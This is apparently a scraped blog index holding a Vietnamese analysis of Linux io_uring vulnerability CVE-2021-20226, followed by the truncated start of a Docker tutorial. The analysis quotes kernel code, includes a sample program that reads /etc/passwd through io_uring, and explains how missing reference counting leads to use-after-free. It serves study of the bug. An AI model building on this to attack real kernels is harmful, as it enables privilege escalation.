PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES)); io = malloc(sizeof(struct iovec)*1); io[0].iov_base = _buf; io[0].iov_len = SIZE; struct timespec ts = { .tv_sec = 1 }; sqes[0] = (struct io_uring_sqe) { .opcode = IORING_OP_TIMEOUT, //.flags = IOSQE_IO_HARDLINK, .len = 1, .addr = (unsigned long)\u0026amp;ts }; sqes[1] = (struct io_uring_sqe) { .opcode = IORING_OP_READV, .addr = io, .flags = 0, .len = 1, .off = 0, .fd = SYSCHK(open(\u0026#34;/etc/passwd\u0026#34;, O_RDONLY)) }; ((int*)(sq_ring + params.sq_off.array))[0] = 0; ((int*)(sq_ring + params.sq_off.array))[1] = 1; (*(int*)(sq_ring + params.sq_off.tail)) += 2; int submitted = SYSCHK(syscall(__NR_io_uring_enter, uring_fd, /*to_submit=*/2, /*min_complete=*/0, /*flags=*/0, /*sig=*/NULL, /*sigsz=*/0)); while(1){ usleep(100000); if(*_buf){ puts(\u0026#34;READV executed.\u0026#34;); break; } puts(\u0026#34;Waiting.\u0026#34;); } } Cùng nhìn lại cơ chế làm việc của io_uring\nFrom: https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a\nChúng ta có một cấu trúc iovec ở line 21 để định nghĩa một phần tử vector 1 2 3 4 struct iovec{ ptr_t iov_base; /* Starting address */ size_t iov_len; /* Length in bytes */ }; Thông thường cấu trúc này được sử dụng như một mảng gồm nhiều phần tử. Mỗi lần chuyển đổi dữ liệu, con trỏ iov_base sẽ trỏ vào vùng đệm để nhận dữ liệu (với lệnh readv) hoặc chuyển dữ liệu (với lệnh writev). Còn phần tử iov_len định nghĩa độ dài tối đa được nhận và được viết trong mỗi lần thực thi. Đoạn code từ line 40-42 để cấp phát cũng như định nghĩa giá trị các phần tử iov_base và iov_len.\nCấu trúc io_uring_params ở line 29 dùng để chuyển các tùy chọn đến kernel và từ kernel truyền thông tin về bộ đệm vòng (ring buffer) 1 2 3 4 5 6 7 8 9 10 11 struct io_uring_params { __u32 sq_entries; __u32 cq_entries; __u32 flags; __u32 sq_thread_cpu; __u32 sq_thread_idle; __u32 features; __u32 resv[4]; struct io_sqring_offsets sq_off; struct io_cqring_offsets cq_off; }; Code từ line 29-39 dùng để tạo 2 vòng đêm buffer cho SQ và CQ cùng với 1 buffer SQEs để lưu các Submission Entries. Cấu trúc timespec ở line 44dùng để đặc tả thời gian ở dạng seconds và nanoseconds: 1 2 3 4 5 6 #include \u0026lt;time.h\u0026gt; struct timespec { time_t tv_sec; long tv_nsec; } Ở đây, nó được tạo với 1 sec.\nCấu trúc io_uring_sqe ở line 37, 46, 52 diễn tả cấu trúc của submission queue entry 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 struct io_uring_sqe { __u8 opcode; /* type of operation for this sqe */ __u8 flags; /* IOSQE_ flags */ __u16 ioprio; /* ioprio for the request */ __s32 fd; /* file descriptor to do IO on */ __u64 off; /* offset into file */ __u64 addr; /* pointer to buffer or iovecs */ __u32 len; /* buffer size or number of iovecs */ union { __kernel_rwf_t rw_flags; __u32 fsync_flags; __u16 poll_events; __u32 sync_range_flags; __u32 msg_flags; }; __u64 user_data; /* data to be passed back at completion time */ union { __u16 buf_index; /* index into fixed buffers, if used */ __u64 __pad2[3]; }; }; Trong đó:\nopcode: để đặc tả hoạt động. Ví dụ: readv dùng hằng số IORING_OP_READV fd: file descriptor của file muốn đọc addr: được dùng để trỏ đến một mảng các iovec. len: giữ giá trị độ dài của mảng các iovec Do đó, đoạn code từ line 52-59 khai báo sử dụng lệnh readv trên file /etc/passwd. Còn từ line 44-51 có sử dụng hằng số IORING_OP_TIMEOUT để chỉ định rằng khi ứng dụng đang sleep thì hoạt động này sẽ được thực hiện.\nCả đoạn code trên, khi thực thi, cứ sau 0.1 seconds sẽ kiểm tra xem liệu readv() đã thực thi xong hay chưa. Và vì ts ta thiết lập nó 1 seconds và truyền vào sqes[0] nên readv() thực thi (sqes[1] thực thi) sẽ sau 1 second. Tuy nhiên, khi thực thi, ta thấy readv() lại thực thi ngay\n1 2 3 4 root@edisc:/home/test# ./sample READV executed root@edisc:/home/test# ./sample READV executed Điều này chứng tỏ, hệ thống không chạy bất đồng bộ, hay nói cách khác, nó chỉ chạy khi nó cần thiết, và trường hợp này là không cần thiết, hoạt động của IORING_OP_TIMEOUT đã bị bỏ qua.\nTa sẽ kiểm tra trong trường hợp chương trình sample chạy bất đồng bộ bằng tool systemtap\nTheo tác giả thì khi thêm flag IORING_OP_HARDLINK thì chương trình sample.c sẽ tiến hành kiếm tra sau 0.1s in ra dòng chữ waiting và sau 1s lệnh READV sẽ được thực thi, và sẽ in ra READV executed. Tuy nhiên trong quá trình kiểm tra trên ubuntu 20.04, kernel 5.8.0-59-generic thì lại nhận được thông báo IORING_OP_HARDLINK chưa được khai báo. Trong khi IORING_OP_LINK vẫn bình thường.\nMột chút về IOSQE_IO_HARDLINK và IOSQE_IO_LINK Ở trên ta có đề cập tới 2 flag IOSQE_IO_HARDLINK và IOSQE_IO_LINK, ta sẽ tìm hiểu nó là gì.\nIOSQE_IO_LINK: cờ này để chỉ định các SQE được chạy trong hàng đợi sẽ phụ thuộc lẫn nhau, phần tử sau đợi phần tử ở trước, giống như trong 1 gia đình, ông bố phải sinh ra rồi thằng con mới được sinh, nếu ông bố sinh thất bại thì thằng con, cháu và cả dòng họ sau này cũng sẽ ra đi theo ông bố. Độ dài của chuỗi sẽ tùy ý, tự mở rộng nếu có thêm SQE vào. IOSQE_IO_HARDLINK: giống như link nhưng nó mạnh hơn. Một số lệnh bị kết thúc do gặp phải lỗi, lúc này kết quả trả về sẽ \u0026lt; 0. Ví dụ, timeout sẽ không có bộ đếm số lần thực hiện, nó sẽ luôn hoàn thành với -ETIME trừ khi nó bị hủy. Do đó, nếu dùng cờ IOSQE_IO_LINK khi 1 SQE trả về giá trị nhỏ hơn 0, nó sẽ cắt đứt toàn bộ chuỗi phía sau. Trường hợp chúng ta có dùng lệnh và biết chắc nó sẽ xảy ra lỗi, khi đó, IOSQE_IO_HARDLINK sẽ làm liên kết mạnh hơn mà không bị cắt đứt bởi kết quả trả về ở SQE trước đó. Chú ý rằng liên kết vẫn sẽ bị ngắt nếu lệnh trước đó không gửi và thực hiện được, các liên kết chỉ được phục hồi khi yêu cầu trước đó nhận được phản hồi. Ta có thể thấy, nguyên lí hoạt động của việc quyết định một tác vụ có chạy được bất đồng bộ hay không như sau:\nTrong ảnh trên, ta thấy mà process bị chặn lại thì nó sẽ chuyển đến IORING_OP_TIMEOUT và từ đây nó sẽ được chuyển sang kernel thread. Như đã đề cập trước đó, API này nó chỉ chạy bất đồng bộ khi cần nghĩa là sẽ có một số điều kiện nào đó để nó chạy bất đồng bộ. Ví dụ một số trường hợp sau.\nKhi bật cờ yêu cầu buộc phải chạy bất đồng bộ REQ_F_FORCE_ASYNC 1 2 3 4 5 6 7 8 9 } else if (req-\u0026gt;flags \u0026amp; REQ_F_FORCE_ASYNC) { ...... /* * Never try inline submit of IOSQE_ASYNC is set, go straight * to async execution. */ req-\u0026gt;work.flags |= IO_WQ_WORK_CONCURRENT; io_queue_async_work(req); } code here\nDo logic của từng hoạt động riêng, ví dụ như thêm flag IOCB_NOWAIT khi gọi readv() và trả về EAGAIN khi muốn dừng. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 static int io_read(struct io_kiocb *req, struct io_kiocb **nxt, bool force_nonblock) { ...... ret = rw_verify_area(READ, req-\u0026gt;file, \u0026amp;kiocb-\u0026gt;ki_pos, iov_count); if (!ret) { ssize_t ret2; if (req-\u0026gt;file-\u0026gt;f_op-\u0026gt;read_iter) ret2 = call_read_iter(req-\u0026gt;file, kiocb, \u0026amp;iter); else ret2 = loop_rw_iter(READ, req-\u0026gt;file, kiocb, \u0026amp;iter); /* Catch -EAGAIN return for forced non-blocking submission */ if (!force_nonblock || ret2 != -EAGAIN) { kiocb_done(kiocb, ret2, nxt, req-\u0026gt;in_async); } else { copy_iov: ret = io_setup_async_rw(req, io_size, iovec, inline_vecs, \u0026amp;iter); if (ret) goto out_free; return -EAGAIN; } } ...... } code here\nỞ đây có cấu trúc io_kiocb phục vụ cho việc đọc file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /* * NOTE! Each of the iocb union members has the file pointer * as the first entry in their struct definition. So you can * access the file pointer through any of the sub-structs, * or directly as just \u0026#39;ki_filp\u0026#39; in this struct. */ struct io_kiocb { union { struct file\t*file; struct io_rw\trw; struct io_poll_iocb\tpoll; struct io_poll_update\tpoll_update; struct io_accept\taccept; struct io_sync\tsync; struct io_cancel\tcancel; struct io_timeout\ttimeout; struct io_timeout_rem\ttimeout_rem; struct io_connect\tconnect; struct io_sr_msg\tsr_msg; struct io_open\topen; struct io_close\tclose; struct io_rsrc_update\trsrc_update; struct io_fadvise\tfadvise; struct io_madvise\tmadvise; struct io_epoll\tepoll; struct io_splice\tsplice; struct io_provide_buf\tpbuf; struct io_statx\tstatx; struct io_shutdown\tshutdown; struct io_rename\trename; struct io_unlink\tunlink; /* use only after cleaning per-op data, see io_clean_op() */ struct io_completion\tcompl; }; Khi giá trị EAGAIN được trả về, process sẽ được đưa vào hàng đợi để chạy bất đồng bộ line 9-23:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 static void __io_queue_sqe(struct io_kiocb *req, const struct io_uring_sqe *sqe) { ...... ret = io_issue_sqe(req, sqe, \u0026amp;nxt, true); /* * We async punt it if the file wasn\u0026#39;t marked NOWAIT, or if the file * doesn\u0026#39;t support non-blocking read/write attempts */ if (ret == -EAGAIN \u0026amp;\u0026amp; (!(req-\u0026gt;flags \u0026amp; REQ_F_NOWAIT) || (req-\u0026gt;flags \u0026amp; REQ_F_MUST_PUNT))) { punt: if (io_op_defs[req-\u0026gt;opcode].file_table) { ret = io_grab_files(req); if (ret) goto err; } /* * Queued up for async execution, worker will release * submit reference when the iocb is actually submitted. */ io_queue_async_work(req); goto done_req; } ...... } Khi cờ IOSQE_IO_LINK | IOSQE_IO_HARDLINK được sử dụng, thứ tự thực thi sẽ được chỉ định, hoạt động đang thực hiện trước đó sẽ được yêu cầu chuyển sang bất đồng bộ. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 static bool io_submit_sqe(struct io_kiocb *req, const struct io_uring_sqe *sqe, struct io_submit_state *state, struct io_kiocb **link) { ...... /* * If we already have a head request, queue this one for async * submittal once the head completes. If we don\u0026#39;t have a head but * IOSQE_IO_LINK is set in the sqe, start a new head. This one will be * submitted sync once the chain is complete. If none of those * conditions are true (normal request), then just queue it. */ if (*link) { ...... list_add_tail(\u0026amp;req-\u0026gt;link_list, \u0026amp;head-\u0026gt;link_list); /* last request of a link, enqueue the link */ if (!(sqe_flags \u0026amp; (IOSQE_IO_LINK|IOSQE_IO_HARDLINK))) { io_queue_link_head(head); *link = NULL; } } else { ...... if (sqe_flags \u0026amp; (IOSQE_IO_LINK|IOSQE_IO_HARDLINK)) { req-\u0026gt;flags |= REQ_F_LINK; INIT_LIST_HEAD(\u0026amp;req-\u0026gt;link_list); if (io_alloc_async_ctx(req)) { ret = -EAGAIN; goto err_req; } ret = io_req_defer_prep(req, sqe); if (ret) req-\u0026gt;flags |= REQ_F_FAIL_LINK; *link = req; } else { io_queue_sqe(req, sqe); } } return true; } line 12-19 là trường hợp đã tồn tại head request, trong đó: line 12-14 đưa sqe vào đuôi của list. line 16-19 là trường hợp không cờ IOSQE_IO_LINK|IOSQE_IO_HARDLINK không được bật\nNếu không tồn tại head request mà cờ IOSQE_IO_LINK|IOSQE_IO_HARDLINK bật, thì hệ thống sẽ tạo một head mới (line 24), và chuyển sang bất đồng bộ(line 25)\nNói một cách chính xác, với IORING_OP_TIMEOUT có một chút đặc biệt, đó là nó không trả về EAGAIN như những minh họa trên, tuy nhiên tác giả nghĩ đây là một ví dụ dễ để hiểu nên ông ta đã quyết định dùng nó để giải thích, minh họa trong blog của mình.\nKhi thay thêm .flags = IOSQE_IO_HARDLINK thì IORING_OP_TIMEOUT sẽ được thực thi bởi 1 thread khác, còn IORING_OP_READV sẽ được thực thi sau 1s. Tuy nhiên, tại thời điểm tôi thực hiện trên linux kernel 5.8.0-59-generic, thì lại không tồn tại flag IOSQE_IO_HARDLINK, Tôi vẫn không biết lí do trên là do io_uring đã bỏ nó đi để fix lỗi, hay do trong quá trình cài đặt tôi đã bị thiếu gì đó. Và một điều nữa, tác giả sử dụng systemstap để debug rất mượt, còn tôi, trong quá trình follow theo thì lại tốn khá nhiều thời gian cho script này và đến bây giờ vẫn thất bại.\nRõ ràng trên hệ thống chỉ có IOSQE_IO_LINK, nhưng khi bật flag này, như đã nói ở trước đó, kết quả đạt được là không như mong muốn vì sqe[0] chưa hoàn thành nên sqe[1] (IORING_OP_READV) sẽ không thực thi.\nMặc dù nó không đưa ra kết quả như mong muốn (cần dùng IOSQE_IO_HARDLINK) nhưng khi dùng IOSQE_IO_LINK từ phía kernel nhìn xuống ta vẫn thấy IORING_OP_READV và IORING_OP_TIMEOUT vẫn được xử lí như 2 thằng, và IORING_OP_TIMEOUT được xem như worker.\nKết quả trên minh họa cho đoạn code để tạo worker từ kernel như sau: 1 2 3 4 5 6 7 static bool create_io_worker(struct io_wq *wq, struct io_wqe *wqe, int index) { ...... worker-\u0026gt;task = kthread_create_on_node(io_wqe_worker, worker, wqe-\u0026gt;node, \u0026#34;io_wqe_worker-%d/%d\u0026#34;, index, wqe-\u0026gt;node); ...... } Khi io_timeout() được gọi, nó sẽ đặt io_timeout_fn() trong handler và bắt đầu bộ đếm thời gian. Sau khi hết thời gian cho phép (timeout) io_timeout_fn() sẽ được gọi để load các hoạt động được kết nối trong hàng đợi để thực thi bất đồng bộ. Tức là IORING_OP_TIMEOUT không có được đặt vào hàng đợi thực thi bất đồng bộ. Tác giả dùng TIMEOUT để giải thích đơn giản vì khi nhắc tới TIMEOUT chúng ta sẽ liên tưởng ngay tới việc luồng thực thi hiện tại sẽ được dừng lại.\nPrecautions when offloading I/O operations to the Kernel Chúng ta đã thấy hoạt động bất đồng bộ trên io_uring sẽ được thực hiện bởi worker và chạy dưới dạng Kernel Thread. Tuy nhiên cần có một số lưu ý: Vì nó chạy ở dạng Kernel Thread, nên ngữ cảnh thực thi (execution context) sẽ khác với khi được gọi bởi io_uring. Ở đây, execution context ám chỉ cấu trúc task_struct của process và các thông tin tương ứng của nó. Ví dụ như mm (Manage the virtual memory space of the process), cred (holds UID/GID/Capability), file struct (holds a table for file descriptors)\nNếu 1 process khi thực thi ở Kernel Thread mà không tham chiếu đúng để cấu trúc trên khi thực hiện systemcall nó có thể trỏ tới bộ nhớ ảo sai, trỏ tới file description table, hoặc đưa ra các hoạt động đặc quyền với Kernel Thread (quyền hạn như root). Trong CVE này, lỗi xảy ra ở đây, người viết tại thời điểm trên quên chuyển cred và làm cho những hoạt động lúc này có thể được thực thi cùng quyền hạn như root. Mặc dù những hoạt động tương đương với open() tại thời điểm chưa được hiện thực, nên chúng ta không thể đọc file, nhưng chúng ta có thể bắn những thông báo (message) đặc quyền trong sendmsg's với tùy chọn SCM_CREDENTIALS để thông báo cho cơ quan có thẩm quyền của người gửi (sender’s authority). Vấn đề này liên quan tới D-Bus. Do đó, trong io_uring những tham khảo đó được đưa vào worker để worker chia sẻ execution context bằng cách chuyển qua context của nó trước khi thực thi. Ví dụ: trong đoạn code sau đây, tại line 6 và line 9 chúng ta có thể thấy tham khảo tới mm và cred được đưa vào req-\u0026gt;work: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 static inline void io_req_work_grab_env(struct io_kiocb *req, const struct io_op_def *def) { if (!req-\u0026gt;work.mm \u0026amp;\u0026amp; def-\u0026gt;needs_mm) { mmgrab(current-\u0026gt;mm); req-\u0026gt;work.mm = current-\u0026gt;mm; } if (!req-\u0026gt;work.creds) req-\u0026gt;work.creds = get_current_cred(); if (!req-\u0026gt;work.fs \u0026amp;\u0026amp; def-\u0026gt;needs_fs) { spin_lock(\u0026amp;current-\u0026gt;fs-\u0026gt;lock); if (!current-\u0026gt;fs-\u0026gt;in_exec) { req-\u0026gt;work.fs = current-\u0026gt;fs; req-\u0026gt;work.fs-\u0026gt;users++; } else { req-\u0026gt;work.flags |= IO_WQ_WORK_CANCEL; } spin_unlock(\u0026amp;current-\u0026gt;fs-\u0026gt;lock); } if (!req-\u0026gt;work.task_pid) req-\u0026gt;work.task_pid = task_pid_vnr(current); } file struct cũng được đưa vào req-\u0026gt;work ở đoạn code sau:\n1 2 3 4 5 6 7 8 9 10 11 static int io_grab_files(struct io_kiocb *req) { ...... if (fcheck(ctx-\u0026gt;ring_fd) == ctx-\u0026gt;ring_file) { list_add(\u0026amp;req-\u0026gt;inflight_entry, \u0026amp;ctx-\u0026gt;inflight_list); req-\u0026gt;flags |= REQ_F_INFLIGHT; req-\u0026gt;work.files = current-\u0026gt;files; ret = 0; } ...... } Và trước khi nó chuyển sang thực thi dưới dạng kernel thread, worker sẽ thay thế những tham khảo được truyền vào với nội dung hiện tại của nó.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 static void io_worker_handle_work(struct io_worker *worker) __releases(wqe-\u0026gt;lock) { struct io_wq_work *work, *old_work = NULL, *put_work = NULL; struct io_wqe *wqe = worker-\u0026gt;wqe; struct io_wq *wq = wqe-\u0026gt;wq; do { ...... if (work-\u0026gt;files \u0026amp;\u0026amp; current-\u0026gt;files != work-\u0026gt;files) { task_lock(current); current-\u0026gt;files = work-\u0026gt;files; task_unlock(current); } if (work-\u0026gt;fs \u0026amp;\u0026amp; current-\u0026gt;fs != work-\u0026gt;fs) current-\u0026gt;fs = work-\u0026gt;fs; if (work-\u0026gt;mm != worker-\u0026gt;mm) io_wq_switch_mm(worker, work); if (worker-\u0026gt;cur_creds != work-\u0026gt;creds) io_wq_switch_creds(worker, work); ...... work-\u0026gt;func(\u0026amp;work); ...... } while (1); } Vulnerability explanation Reference counter in files_struct structure when sharing with the worker Trong đoạn code sau đây, worker đang chuyển một tham chiếu đến cấu trúc files_struct của luồng đang thực hiện lệnh gọi hệ thống tới cấu trúc mà worker sẽ tham chiếu sau này mà không cần tăng bộ đếm tham chiếu.\n1 2 3 4 5 6 7 8 9 10 11 static int io_grab_files(struct io_kiocb *req) { ...... if (fcheck(ctx-\u0026gt;ring_fd) == ctx-\u0026gt;ring_file) { list_add(\u0026amp;req-\u0026gt;inflight_entry, \u0026amp;ctx-\u0026gt;inflight_list); req-\u0026gt;flags |= REQ_F_INFLIGHT; req-\u0026gt;work.files = current-\u0026gt;files; ret = 0; } ...... } Bằng cách này, khi vào hàng đợi thực thi bất đồng bộ, tham chiếu tới cấu trúc file được giữ lại đầu tiên từ bộ mô tả tệp được chỉ định\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 static int io_req_set_file(struct io_submit_state *state, struct io_kiocb *req, const struct io_uring_sqe *sqe) { struct io_ring_ctx *ctx = req-\u0026gt;ctx; unsigned flags; int fd; flags = READ_ONCE(sqe-\u0026gt;flags); fd = READ_ONCE(sqe-\u0026gt;fd); if (!io_req_needs_file(req, fd)) return 0; if (flags \u0026amp; IOSQE_FIXED_FILE) { if (unlikely(!ctx-\u0026gt;file_data || (unsigned) fd \u0026gt;= ctx-\u0026gt;nr_user_files)) return -EBADF; fd = array_index_nospec(fd, ctx-\u0026gt;nr_user_files); req-\u0026gt;file = io_file_from_index(ctx, fd); if (!req-\u0026gt;file) return -EBADF; req-\u0026gt;flags |= REQ_F_FIXED_FILE; percpu_ref_get(\u0026amp;ctx-\u0026gt;file_data-\u0026gt;refs); } else { if (req-\u0026gt;needs_fixed_file) return -EBADF; trace_io_uring_file_get(ctx, fd); req-\u0026gt;file = io_file_get(state, fd); if (unlikely(!req-\u0026gt;file)) return -EBADF; } return 0; } Do đó, worker không cần phải trích xuất nó từ fd hoặc trỏ tới cấu trúc files_struct một lần nữa. Nếu như thế thì việc không tăng bộ đếm tham chiếu tới files_struct không bị ảnh hưởng gì. Nhưng giả định trên không đúng với Linux Kernel 5.5 trở lên bởi vì những system call sẽ ảnh hưởng tới file descriptor table như open/close/accept đã có sẵn trên io_uring, do đó, chúng ta có thể sử dụng để khai thác. Tuy nhiên,\nChỉ gọi những syscall 1 cách thông thường sẽ chẳng có gì xảy ra khi cấu trúc file_struct đã sẵn sàng, và ko thể tạo ra race condition vì syscall có countermeasures khi xử lí một file bằng nhiều thread. Giải phóng files_struct bằng cách thiết lập reference counter bằng 0 =\u0026gt; 1 process nào đó có thể dùng nó như là file_struct của nó để thực hiện. Một ví dụ như nhà của bạn mà bạn để bảng \u0026ldquo;nhà hoang\u0026rdquo; thì một người nào đó có thể đi vào đó ở, sinh sống. Chúng ta có thể chèn 1 cấu trúc file vào file description table của process mới bằng mở 1 file, nhưng nó sẽ không được reference vì người dùng không sử dụng cố định số lượng file descriptor trong khi lập trình. Mechanism of reference counter in open/close system call Để hiểu reference counter trong cấu trúc file hoạt động như thế nào, trước tiên cần hiểu cách thức hoạt động của open/close. Cách thức này sẽ phụ thuộc vào từng file riêng, nhưng có 1 số điểm chung:\nOpen Tạo 1 cấu trúc file và thiết lập reference counter = 1 1 2 3 4 5 6 7 8 9 10 static struct file *__alloc_file(int flags, const struct cred *cred) { struct file *f; int error; f = kmem_cache_zalloc(filp_cachep, GFP_KERNEL); ...... atomic_long_set(\u0026amp;f-\u0026gt;f_count, 1); ...... return f; } Đăng kí nó vào file description table (fd_install). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 static long do_sys_openat2(int dfd, const char __user *filename, struct open_how *how) { ...... fd = get_unused_fd_flags(how-\u0026gt;flags); if (fd \u0026gt;= 0) { struct file *f = do_filp_open(dfd, tmp, \u0026amp;op); if (IS_ERR(f)) { put_unused_fd(fd); fd = PTR_ERR(f); } else { fsnotify_open(f); fd_install(fd, f); } } putname(tmp); return fd; } close 1 Xóa trong file description table.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 int __close_fd(struct files_struct *files, unsigned fd) { struct file *file; struct fdtable *fdt; spin_lock(\u0026amp;files-\u0026gt;file_lock); fdt = files_fdtable(files); if (fd \u0026gt;= fdt-\u0026gt;max_fds) goto out_unlock; file = fdt-\u0026gt;fd[fd]; if (!file) goto out_unlock; rcu_assign_pointer(fdt-\u0026gt;fd[fd], NULL); __put_unused_fd(files, fd); spin_unlock(\u0026amp;files-\u0026gt;file_lock); return filp_close(file, files); out_unlock: spin_unlock(\u0026amp;files-\u0026gt;file_lock); return -EBADF; } Giảm reference counter của cấu trúc file (fput) 1 2 3 4 5 6 int filp_close(struct file *filp, fl_owner_t id) { ...... fput(filp); return retval; } Ở đây chú ý tới hàm fget()/fput(). Chúng sẽ tăng hoặc giảm reference counter và fput() sẽ giải phóng của cấu trúc file khi reference counter bằng 0. Nếu chúng ta mở file bằng fget() reference counter sẽ không thể bằng 0 ngay cả khi ta đóng file trước khi gọi fput() (bộ đếm sẽ có gía trị là 1 khi chạy lệnh open(), tăng lên 2 khi gọi fget() và nếu lúc này đóng thì nó sẽ giảm xuống còn 1). Do đó, nếu file bị đóng khi đang sử dụng vẫn không có vấn đề gì, vì reference counter vẫn chưa bằng 0 nên cấu trúc file không thể bị giải phóng.\nXét trường hợp gọi mmap, sẽ có vấn đề xảy ra nếu vùng nhớ được giải phóng trước khi gọi munmap, thậm chí là khi gọi close() rồi mà tiếp tục gọi munmap vẫn sẽ bị lỗi. Do đó, fget() được dùng trong mmap để tránh trường hợp bộ nhớ bị giải phóng.\n1 2 3 4 5 6 7 8 9 10 11 unsigned long ksys_mmap_pgoff(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long pgoff) { struct file *file = NULL; unsigned long retval; if (!(flags \u0026amp; MAP_ANONYMOUS)) { audit_mmap_fd(fd, flags); file = fget(fd); ...... } fdget() which doesn’t change reference counter 2 hàm fdget()/fdput() thường xuyên được sử dụng để tham khảo tới những cấu trúc file được sử dụng nhiều trong system call handlers.\nVí dụ, trong system call read, cấu trúc file được sử dụng giữa fdget()/fdget_pos() và fdput()/fdput_pos() được sử dụng như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count) { struct fd f = fdget_pos(fd); ssize_t ret = -EBADF; if (f.file) { loff_t pos, *ppos = file_ppos(f.file); if (ppos) { pos = *ppos; ppos = \u0026amp;pos; } ret = vfs_read(f.file, buf, count, ppos); if (ret \u0026gt;= 0 \u0026amp;\u0026amp; ppos) f.file-\u0026gt;f_pos = pos; fdput_pos(f); } return ret; } SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count) { return ksys_read(fd, buf, count); } Có một lí do nào đó để hệ thống không cần phải tăng/giảm reference counter của cấu trúc file một cách thường xuyên, có lẽ do ảnh hưởng của bộ nhớ cache(). Do đó, fdget() sẽ không tăng reference counter của cấu trúc file dưới một số điều kiện nhất định. fdget() cuối cùng sẽ gọi hàm __fget_light()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 /* * Lightweight file lookup - no refcnt increment if fd table isn\u0026#39;t shared. * * You can use this instead of fget if you satisfy all of the following * conditions: * 1) You must call fput_light before exiting the syscall and returning control * to userspace (i.e. you cannot remember the returned struct file * after * returning to userspace). * 2) You must not call filp_close on the returned struct file * in between * calls to fget_light and fput_light. * 3) You must not clone the current task in between the calls to fget_light * and fput_light. * * The fput_needed flag returned by fget_light should be passed to the * corresponding fput_light. */ static unsigned long __fget_light(unsigned int fd, fmode_t mask) { struct files_struct *files = current-\u0026gt;files; struct file *file; if (atomic_read(\u0026amp;files-\u0026gt;count) == 1) { file = __fcheck_files(files, fd); if (!file || unlikely(file-\u0026gt;f_mode \u0026amp; mask)) return 0; return (unsigned long)file; } else { file = __fget(fd, mask, 1); if (!file) return 0; return FDPUT_FPUT | (unsigned long)file; } } Trong chương trình đa luồng, file descriptor sẽ được chia sẻ (\u0026amp;file-\u0026gt;count \u0026gt;= 2) và cùng 1 file descriptor trỏ đến đến cùng 1 tệp. Trong trường hợp này, những thread khác có gọi close() trong khi read() vẫn đang thực thi. Lúc này, fdget() của read() system call được gọi để giảm reference counter.\nTuy nhiên, với chương trình chạy đơn luồng khác, tại 1 thời điểm chỉ có 1 thread thực hiện, nên sẽ không thể xảy tra trường hợp trên, do đó, fdget() không cần phải tăng reference counter. Do đó, nó sẽ không tăng reference counter trừ khi file descriptor table được chia sẻ.\nCombining vulnerabilities with the fdget() spec Lỗ hổng từ việc chuyển 1 tham khảo file struct vào 1 cấu trúc worker trỏ tới mà không tăng reference counter và nếu chương trình gốc là đơn luồng, thì \u0026amp;file-\u0026gt;count = 1 dù cho file descripton table được chia sẻ. \u0026amp;files-\u0026gt;count = 1 có nghĩa là fdget() sẽ không tăng reference counter trong cấu trúc file. Do đó, vùng nhớ của cấu trúc file được sự dụng bởi fdget() có thể bị giải phóng ở 1 thời điểm nào đó.\nTóm tắt Lỗi này như sau:\nAIO worker chia sẻ cấu trúc file_struct với thread được gọi, và tại thời điểm, reference counter của cấu trúc files_struct không tăng lên. vì fdget không tăng reference counter của cấu trúc file trong khi reference counter được khởi tạo có giá trị là 1. file được mở bởi fdget()có thể bị đóng và giải phóng trong worker. Vì cấu trúc file bị giải phóng nên lỗi UAF có thể xảy ra. ","description":"khai thác lỗi trên io_uring dẫn tới UAF (chưa hoàn thành)","id":16,"section":"posts","tags":["cve, io_uring"],"title":"Tìm hiểu về CVE-2021-20226","uri":"https://minhlongmt183.github.io/posts/cve-2021-20226/"},{"content":"Tiếp tục với bài trước, hôm nay chúng ta sẽ đi qua những nhánh tiếp theo của docker foundation - những kiến thức nền tảng của docker. Nhìn một cách tổng quan về nội dung của những kiến thức nền tảng\nBuild Container Image Chúng ta sẽ tiến hành build một container image, ở đây chủ yếu ôn lại kiến thức về Dockerfile đã học ở bài trước\nStep 1 - Base Images Tất cả các Docker Images đều bắt đầu từ một base image. Base image này giống với image mà chúng ta tải trực tiếp từ các Registry về để xây dựng các container. Bên cạnh dùng tên, các base image còn dùng tag để phân biệt giữa các phiên bản trong cùng 1 image.\nTrong Dockerfile, ta dùng FROM để chỉ định base image sử dụng. Ví dụ ta muốn dùng một base image là nginx:1.11-alpine thì trong Dockerfile ta sẽ khai báo:\n1 FROM nginx:1.11-alpine Step 2 - Running Commands Có nhiều câu lệnh cần thực thi khi build image, ta có thể chỉ định những lệnh này trong Dockerfile. Chi tiết về những câu lệnh này đã được thảo luận ở phần 6. Ở đây ta dùng lệnh COPY để copy nội dung file index.html đến địa chỉ cụ thể trên docker\n1 2 FROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html Step 3 - Exposing Ports Từ khóa EXPOSE dùng để chỉ định cổng mà ứng dụng có sử dụng khi muốn truy cập vào Docker từ bên ngoài.\nVí dụ, ta muốn chỉ định cổng 80 sẽ cho phép truy cập, ta khai báo như sau:\n1 EXPOSE 80 Step 4 - Default Commands Default Command chỉ định những lệnh sẽ được thực thi sau khi build xong image để tiến hành setup môi trường mà chúng ta mong muốn. Những default 